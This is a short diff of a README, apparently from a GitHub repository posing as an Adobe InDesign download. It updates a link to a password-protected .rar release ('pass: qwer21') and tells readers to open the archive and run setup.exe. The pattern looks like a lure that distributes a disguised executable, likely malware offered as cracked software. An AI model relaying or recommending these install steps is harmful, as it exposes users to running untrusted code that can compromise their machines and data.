@@ -2,7 +2,7 @@
 
 <H3>How install:</H3>
 
-1. [Download](https://github.com/mitclhd/in-design/releases/download/download/indesign.rar)
+1. [Download](https://github.com/mitclhd/in-design/releases/download/download/InDesign22.rar)
 2. Open archive (pass: qwer21)
 3. Open setup.exe
 4. Standard installation
